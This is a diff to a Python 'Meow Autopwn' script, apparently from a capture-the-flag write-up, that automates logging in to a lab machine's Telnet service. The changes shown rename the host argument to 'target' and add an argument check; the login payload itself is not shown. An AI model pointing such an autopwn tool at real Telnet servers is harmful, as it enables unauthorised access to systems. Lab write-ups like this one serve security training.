@@ -183,8 +183,8 @@ from termcolor import colored
 
 def get_args():
 
-    parser = argparse.ArgumentParser()
-    parser.add_argument('-lh', '--lhost', help='Dirección IP del servidor', dest='host')
+    parser = argparse.ArgumentParser(prog='Meow Autopwn')
+    parser.add_argument('-t', '--target', help='Dirección IP del servidor', dest='target')
     parser.add_argument('-p', '--port', help='Puerto del servicio en el que está corriendo el servicio Telnet', type=int, dest='port')
 
     return parser.parse_args()
@@ -195,9 +195,9 @@ async def write_to_server(wr, txt):
     await wr.drain()
 
 
-async def meow(host, port):
+async def meow(target, port):
     
-    reader, writer = await telnetlib3.open_connection(host, port)
+    reader, writer = await telnetlib3.open_connection(target, port)
 
     banner = await reader.readuntil(b'login: ')
     print(banner.decode('utf-8'), end='')
@@ -218,11 +218,13 @@ async def meow(host, port):
 	
 if __name__ == '__main__':
 
-    print(colored('\n[+]', 'blue'), 'Meow', colored('[+]', 'blue'))
-
     args = get_args()
+
+    if args.target and args.port:
+
+        print(colored('\n[+]', 'blue'), 'Meow', colored('[+]', 'blue'))
     
-    asyncio.run(meow(args.host, args.port))
+        asyncio.run(meow(args.target, args.port))
 ```
 
 ![Meow Autopwn](/Images/meow_autopwn.png)
